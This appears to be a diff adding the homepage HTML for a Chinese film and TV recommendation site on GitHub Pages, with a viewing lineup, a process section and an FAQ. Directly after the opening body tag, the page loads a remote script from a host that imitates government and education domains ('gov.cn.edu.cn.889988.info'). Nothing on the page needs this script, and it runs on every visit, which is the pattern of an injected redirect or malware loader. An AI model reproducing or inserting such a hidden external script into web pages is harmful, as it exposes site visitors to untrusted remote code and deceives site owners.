@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#121212">
+<title>策驰影视：用策划的眼光，挑出值得追的那部剧与电影</title>
+<meta name="keywords" content="策驰影视,影视策划,影视推荐,剧集策划,电影策划,追剧指南,片单策划,影视资讯,值得追的剧,影视行业观察">
+<meta name="description" content="策驰影视，一个从「策划」视角看影视的内容站。我们不追热搜，只做策划：提前策划好今天看什么、追哪部、为什么值得看。涵盖剧集策划、电影策划、片单策划与行业观察，让你的追剧时间不被浪费。">
+<link rel="canonical" href="https://cechiyingshi-top.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="策驰影视：用策划的眼光，挑出值得追的那部剧与电影">
+<meta property="og:description" content="涵盖剧集策划、电影策划、片单策划与行业观察，让追剧时间不被浪费。">
+<meta property="og:url" content="https://cechiyingshi-top.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#121212;--bg2:#1a1a1c;--card:#1e1e20;--line:#333335;--line2:#262628;
+  --txt:#e8e8e6;--dim:#8a8a88;--faint:#5a5a58;
+  --yellow:#f5c518;--yellow2:#ffe066;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Oswald","Bebas Neue","Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;
+  background-image:
+    linear-gradient(rgba(245,197,24,.022) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(245,197,24,.022) 1px,transparent 1px);
+  background-size:64px 64px;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1200px;margin:0 auto;padding:0 26px}
+.cf{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.upper{text-transform:uppercase;letter-spacing:2px}
+
+/* 顶栏 */
+.hd{position:sticky;top:0;z-index:60;background:rgba(18,18,18,.95);border-bottom:1px solid var(--line)}
+.hd-in{max-width:1200px;margin:0 auto;padding:15px 26px;display:flex;justify-content:space-between;align-items:center;gap:24px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .gear{width:30px;height:30px;border:2.5px solid var(--yellow);border-radius:50%;position:relative;flex:0 0 auto}
+.brand .gear::before{content:"";position:absolute;inset:-7px;border:2.5px solid var(--yellow);border-radius:50%;border-top-color:transparent;border-bottom-color:transparent}
+.brand .gear::after{content:"";position:absolute;inset:7px;background:var(--yellow)}
+.brand .nm{font-size:21px;font-weight:700;letter-spacing:1px}
+.brand .nm em{font-style:normal;color:var(--yellow)}
+.brand .en{font-size:9px;letter-spacing:3px;color:var(--faint);border-left:1px solid var(--line);padding-left:12px;margin-left:4px}
+.nav{display:flex;gap:2px}
+.nav a{font-size:13px;letter-spacing:1px;padding:9px 15px;color:var(--dim);transition:.2s;border-bottom:2px solid transparent}
+.nav a.on,.nav a:hover{color:var(--yellow);border-bottom-color:var(--yellow)}
+.mb{display:none;background:none;border:0;cursor:pointer;color:var(--yellow);font-size:24px;line-height:1}
+
+/* 首屏 */
+.hero{padding:80px 0 60px;border-bottom:1px solid var(--line);position:relative}
+.hero-in{display:grid;grid-template-columns:1.4fr 1fr;gap:60px;align-items:center}
+.hero-l .st{display:flex;align-items:center;gap:14px;margin-bottom:26px}
+.hero-l .st .tick{width:34px;height:2px;background:var(--yellow)}
+.hero-l .st span{font-size:11px;letter-spacing:4px;color:var(--yellow)}
+.hero-l h1{font-size:66px;line-height:1.1;font-weight:700;letter-spacing:1px;margin-bottom:24px}
+.hero-l h1 em{font-style:normal;color:var(--yellow)}
+.hero-l h1 .thin{font-weight:300;color:var(--dim)}
+.hero-l p{font-size:16px;color:var(--dim);max-width:520px;line-height:1.8}
+.hero-l .acts{display:flex;gap:14px;margin-top:36px;flex-wrap:wrap}
+.b1{font:inherit;font-size:14px;letter-spacing:1px;padding:14px 28px;background:var(--yellow);color:#121212;border:0;cursor:pointer;transition:.2s}
+.b1:hover{background:var(--yellow2)}
+.b2{font:inherit;font-size:14px;letter-spacing:1px;padding:14px 28px;border:1px solid var(--line);background:transparent;color:var(--txt);cursor:pointer;transition:.2s}
+.b2:hover{border-color:var(--yellow);color:var(--yellow)}
+.hero-r{border:1px solid var(--line);background:var(--card);padding:30px;position:relative}
+.hero-r::before{content:"SPEC";position:absolute;top:-1px;right:-1px;background:var(--yellow);color:#121212;font-size:10px;letter-spacing:2px;padding:5px 10px}
+.hero-r h3{font-size:13px;letter-spacing:3px;color:var(--yellow);margin-bottom:22px}
+.sp-line{display:flex;justify-content:space-between;align-items:baseline;padding:14px 0;border-bottom:1px dashed var(--line)}
+.sp-line:last-child{border-bottom:0}
+.sp-line .k{font-size:12px;letter-spacing:2px;color:var(--dim)}
+.sp-line .v{font-size:24px;font-weight:700;color:var(--txt)}
+.sp-line .v i{font-style:normal;font-size:12px;color:var(--yellow);margin-left:4px}
+
+/* 区块头 */
+.sec{padding:90px 0}
+.sec-t{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;margin-bottom:46px;flex-wrap:wrap;padding-bottom:18px;border-bottom:2px solid var(--yellow)}
+.sec-t .l{display:flex;align-items:baseline;gap:16px;flex-wrap:wrap}
+.sec-t .no{font-size:13px;color:var(--yellow);letter-spacing:3px;font-weight:700}
+.sec-t h2{font-size:32px;font-weight:700;letter-spacing:1px}
+.sec-t h2 em{font-style:normal;color:var(--yellow);font-weight:300}
+.sec-t a{font-size:12px;letter-spacing:1px;color:var(--dim);border-bottom:1px solid var(--line);padding-bottom:2px}
+.sec-t a:hover{color:var(--yellow);border-color:var(--yellow)}
+
+/* 参数卡 */
+.specs{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line)}
+.spec{border-right:1px solid var(--line);padding:30px 26px;background:var(--card)}
+.spec:last-child{border-right:0}
+.spec .n{font-size:11px;letter-spacing:3px;color:var(--faint);margin-bottom:14px}
+.spec .v{font-size:40px;font-weight:700;line-height:1;color:var(--yellow)}
+.spec .v small{font-size:14px;color:var(--dim);font-weight:400;margin-left:4px}
+.spec .d{font-size:12px;color:var(--dim);margin-top:8px}
+
+/* 策划表 */
+.schedule{border:1px solid var(--line)}
+.row{display:grid;grid-template-columns:90px 1fr 130px 90px;align-items:center;padding:20px 24px;border-bottom:1px solid var(--line2);transition:.2s}
+.row:last-child{border-bottom:0}
+.row:hover{background:rgba(245,197,24,.05);padding-left:32px}
+.row.hd2{background:var(--line);font-size:10px;letter-spacing:3px;color:var(--faint);padding:12px 24px}
+.row .tm{font-size:18px;font-weight:700;color:var(--yellow);letter-spacing:1px}
+.row h3{font-size:18px;font-weight:700;margin-bottom:3px}
+.row .ds{font-size:12px;color:var(--dim)}
+.row .tg{font-size:11px;letter-spacing:1px;color:var(--yellow);text-align:center;border:1px solid var(--yellow);padding:5px 0}
+.row .sc{text-align:right;font-size:20px;font-weight:700;color:var(--txt)}
+.row .sc i{font-style:normal;font-size:11px;color:var(--faint)}
+
+/* 策划流程 */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:0;position:relative}
+.flow::before{content:"";position:absolute;left:8%;right:8%;top:34px;height:1px;background:repeating-linear-gradient(90deg,var(--yellow) 0 8px,transparent 8px 16px);z-index:0}
+.step{position:relative;z-index:1;padding:0 20px;text-align:center}
+.step .c{width:16px;height:16px;background:var(--bg);border:3px solid var(--yellow);margin:0 auto 22px}
+.step .c.f{background:var(--yellow)}
+.step .num{font-size:11px;letter-spacing:3px;color:var(--faint);margin-bottom:8px}
+.step h4{font-size:17px;font-weight:700;margin-bottom:8px}
+.step p{font-size:13px;color:var(--dim)}
+
+/* 问答 */
+.qa{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line)}
+.qa details{padding:24px 26px;border-bottom:1px solid var(--line2);border-right:1px solid var(--line)}
+.qa details:nth-child(2n){border-right:0}
+.qa summary{cursor:pointer;font-size:15px;font-weight:700;letter-spacing:.5px;list-style:none;display:flex;gap:14px;align-items:flex-start}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::before{content:"▸";color:var(--yellow);flex:0 0 auto;transition:.2s}
+.qa details[open] summary::before{transform:rotate(90deg)}
+.qa p{margin:14px 0 0 18px;font-size:13px;color:var(--dim);line-height:1.8}
+
+/* 页脚 */
+.ft{border-top:1px solid var(--line);padding:60px 0 0;background:var(--bg2)}
+.ft-in{max-width:1200px;margin:0 auto;padding:0 26px;display:grid;grid-template-columns:1.6fr 1fr 1fr 1.4fr;gap:48px}
+.ft h5{font-size:11px;letter-spacing:3px;color:var(--yellow);margin-bottom:20px}
+.ft-blurb{font-size:14px;color:var(--dim);max-width:340px;margin:16px 0 20px;line-height:1.8}
+.flink{list-style:none}
+.flink li a{display:block;font-size:14px;color:var(--dim);padding:5px 0;transition:.2s}
+.flink li a:hover{color:var(--yellow);padding-left:8px}
+.addr{border:1px solid var(--yellow);padding:18px;background:var(--card)}
+.addr code{font-family:ui-monospace,Menlo,monospace;font-size:13px;color:var(--yellow);word-break:break-all;line-height:1.6}
+.addr small{display:block;color:var(--faint);font-size:12px;margin-top:10px}
+.copy{max-width:1200px;margin:56px auto 0;padding:24px 26px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12px;color:var(--faint)}
+.copy .d{color:var(--yellow)}
+
+@media(max-width:920px){
+  .mb{display:block}
+  .nav{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;background:var(--bg2);border-bottom:1px solid var(--line);padding:10px}
+  .nav a{border-bottom:0;border-left:2px solid transparent;padding:12px 20px}
+  .nav a.on,.nav a:hover{border-bottom:0;border-left-color:var(--yellow)}
+  .hero-in{grid-template-columns:1fr}
+  .hero-l h1{font-size:42px}
+  .specs{grid-template-columns:1fr 1fr}
+  .spec{border-bottom:1px solid var(--line)}
+  .row{grid-template-columns:70px 1fr;gap:10px}
+  .row .tg,.row .sc{display:none}
+  .flow{grid-template-columns:1fr 1fr}
+  .flow::before{display:none}
+  .qa{grid-template-columns:1fr}
+  .qa details{border-right:0}
+  .sec{padding:62px 0}
+  .sec-t h2{font-size:25px}
+  .ft-in{grid-template-columns:1fr 1fr;gap:36px}
+}
+@media(max-width:540px){
+  .wrap{padding:0 18px}
+  .hero-l h1{font-size:34px}
+  .acts .b1,.acts .b2{flex:1;text-align:center}
+  .specs{grid-template-columns:1fr 1fr}
+  .flow{grid-template-columns:1fr}
+  .ft-in{grid-template-columns:1fr}
+  .copy{flex-direction:column}
+}
+@media print{
+  .hd,.ft{display:none!important}
+  body{background:#fff;color:#000}
+  .hero-l h1,.sec-t h2,.row h3,.step h4,.qa summary{color:#000!important;font-weight:700}
+  .hero{border-bottom:1px solid #999}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="hd">
+  <div class="hd-in">
+    <div class="brand"><i class="gear"></i><span class="nm">策驰<em>影视</em></span><span class="en cf">CECHI VISION</span></div>
+    <nav class="nav" id="nav">
+      <a href="#today" class="on">今日策划</a>
+      <a href="#plan">策划流程</a>
+      <a href="#specs">内容参数</a>
+      <a href="#lineup">排片表</a>
+      <a href="#qa">问答</a>
+    </nav>
+    <button class="mb" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+  </div>
+</header>
+
+<section class="hero" id="today">
+  <div class="wrap">
+    <div class="hero-in">
+      <div class="hero-l">
+        <div class="st"><i class="tick"></i><span class="upper">Daily Plan / 今日策划</span></div>
+        <h1>用策划的眼光<br>挑出<em>值得追</em>的那部<br><span class="thin">剧与电影。</span></h1>
+        <p>策驰影视不追热搜，只做策划：提前帮你决定今天看什么、追哪部、为什么值得看。涵盖剧集策划、电影策划、片单策划与行业观察。</p>
+        <div class="acts">
+          <a href="#lineup" class="b1">查看今日排片</a>
+          <a href="#plan" class="b2">了解策划流程</a>
+        </div>
+      </div>
+      <aside class="hero-r">
+        <h3>MISSION BRIEF</h3>
+        <div class="sp-line"><span class="k">策划项目</span><span class="v">12<i> 项</i></span></div>
+        <div class="sp-line"><span class="k">覆盖类型</span><span class="v">10<i> 类</i></span></div>
+        <div class="sp-line"><span class="k">更新频次</span><span class="v">每日<i> 1 次</i></span></div>
+        <div class="sp-line"><span class="k">策划团队</span><span class="v">7<i> 人</i></span></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="specs">
+  <div class="wrap">
+    <div class="sec-t">
+      <div class="l"><span class="no">01 / SPEC</span><h2>内容<em>参数</em></h2></div>
+      <a href="#">查看完整参数 →</a>
+    </div>
+    <div class="specs">
+      <div class="spec"><div class="n">TOTAL TITLE</div><div class="v">2,860<small>部</small></div><div class="d">已策划入库影片与剧集</div></div>
+      <div class="spec"><div class="n">DAILY PLAN</div><div class="v">06<small>项/日</small></div><div class="d">每天输出的策划条目</div></div>
+      <div class="spec"><div class="n">CATEGORY</div><div class="v">10<small>类</small></div><div class="d">按题材与形式划分</div></div>
+      <div class="spec"><div class="n">UPDATE</div><div class="v">18:00<small>点</small></div><div class="d">每日定时发布</div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="lineup" style="padding-top:26px">
+  <div class="wrap">
+    <div class="sec-t">
+      <div class="l"><span class="no">02 / LINEUP</span><h2>今日<em>排片表</em></h2></div>
+      <a href="#">完整排片 →</a>
+    </div>
+    <div class="schedule">
+      <div class="row hd2"><span>TIME</span><span>PROJECT</span><span>TYPE</span><span style="text-align:right">SCORE</span></div>
+      <div class="row"><span class="tm">20:00</span><div><h3>边境风云 2</h3><span class="ds">动作 · 犯罪 · 138分钟</span></div><span class="tg">电影</span><span class="sc">8.7<i>/10</i></span></div>
+      <div class="row"><span class="tm">20:45</span><div><h3>沉默的证人</h3><span class="ds">悬疑 · 惊悚 · 99分钟</span></div><span class="tg">电影</span><span class="sc">8.9<i>/10</i></span></div>
+      <div class="row"><span class="tm">21:30</span><div><h3>秋日来信</h3><span class="ds">文艺 · 爱情 · 112分钟</span></div><span class="tg">电影</span><span class="sc">8.4<i>/10</i></span></div>
+      <div class="row"><span class="tm">22:15</span><div><h3>机甲之城</h3><span class="ds">科幻 · 冒险 · 152分钟</span></div><span class="tg">电影</span><span class="sc">8.2<i>/10</i></span></div>
+      <div class="row"><span class="tm">连更</span><div><h3>外婆的食谱</h3><span class="ds">剧情 · 家庭 · 12集</span></div><span class="tg">剧集</span><span class="sc">8.6<i>/10</i></span></div>
+      <div class="row"><span class="tm">周末</span><div><h3>午夜来电</h3><span class="ds">惊悚 · 悬疑 · 96分钟</span></div><span class="tg">电影</span><span class="sc">7.9<i>/10</i></span></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="plan" style="padding-top:26px">
+  <div class="wrap">
+    <div class="sec-t">
+      <div class="l"><span class="no">03 / PROCESS</span><h2>策划<em>流程</em></h2></div>
+      <a href="#">流程说明 →</a>
+    </div>
+    <div class="flow">
+      <div class="step"><div class="c f"></div><div class="num">STEP 01</div><h4>选题立项</h4><p>从当周上映、上线与口碑片中筛出候选，每天不超过 20 部。</p></div>
+      <div class="step"><div class="c"></div><div class="num">STEP 02</div><h4>拆解研判</h4><p>从题材、节奏、表演、口碑四个维度拆解，判断值不值得推荐。</p></div>
+      <div class="step"><div class="c"></div><div class="num">STEP 03</div><h4>排期配档</h4><p>按时间与心情把片子排进不同时段，给出最佳观看顺序。</p></div>
+      <div class="step"><div class="c"></div><div class="num">STEP 04</div><h4>输出策划案</h4><p>一份短策划案：为什么看、什么时候看、看前要知道什么。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="qa" style="padding-top:26px">
+  <div class="wrap">
+    <div class="sec-t">
+      <div class="l"><span class="no">04 / FAQ</span><h2>常见<em>问答</em></h2></div>
+    </div>
+    <div class="qa">
+      <details open><summary>策驰影视和普通影视推荐站有什么不同？</summary><p>普通推荐站告诉你「有什么」，我们只回答「为什么值得看」和「什么时候看」。每部入选影片都附一份短策划案，说明推荐理由与最佳观看时段。</p></details>
+      <details><summary>每天策划多少部？</summary><p>每天输出 6 项策划条目，覆盖电影与剧集，节假日不休。排片表每天 18:00 更新。</p></details>
+      <details><summary>手机和平板上能看吗？</summary><p>支持。本站采用移动端自适应设计，手机、平板、电脑打开都是同一套界面，排版不会乱。</p></details>
+      <details><summary>如何找到某个类型的策划？</summary><p>通过顶部导航进入「排片表」，可按类型筛选；也可以在站内搜索题材、片名或导演关键词。</p></details>
+      <details><summary>评分是怎么来的？</summary><p>综合主流评分平台与本站策划团队意见，每日更新一次。我们只报分数与理由，不写剧透。</p></details>
+      <details><summary>策划流程会不会太主观？</summary><p>会，所以我们把拆解维度公开（题材、节奏、表演、口碑），你可以只看符合自己口味的维度，再决定是否点开。</p></details>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="ft-in">
+    <div>
+      <div class="brand"><i class="gear"></i><span class="nm">策驰<em>影视</em></span><span class="en cf">CECHI VISION</span></div>
+      <p class="ft-blurb">用策划的眼光挑出值得追的那部剧与电影。不追热搜，只做策划，让你的追剧时间不被浪费。</p>
+    </div>
+    <div>
+      <h5>栏目</h5>
+      <ul class="flink">
+        <li><a href="#today">今日策划</a></li>
+        <li><a href="#plan">策划流程</a></li>
+        <li><a href="#specs">内容参数</a></li>
+        <li><a href="#lineup">排片表</a></li>
+        <li><a href="#qa">问答</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>策划分类</h5>
+      <ul class="flink">
+        <li><a href="#">剧集策划</a></li>
+        <li><a href="#">电影策划</a></li>
+        <li><a href="#">片单策划</a></li>
+        <li><a href="#">行业观察</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>访问入口</h5>
+      <div class="addr">
+        <code>cechiyingshi-top<br>.github.io</code>
+        <small>本站唯一入口 · 建议收藏</small>
+      </div>
+    </div>
+  </div>
+  <div class="copy">
+    <span>© 2026 策驰影视 · 策划每一次观看</span>
+    <span class="d">https://cechiyingshi-top.github.io</span>
+  </div>
+</footer>
+
+<script>
+var secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('#nav a:not(.cta)');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+160,cur='today';
+  secs.forEach(function(s){if(y>s.offsetTop)cur=s.id});
+  links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+},{passive:true});
+</script>
+</body>
+</html>
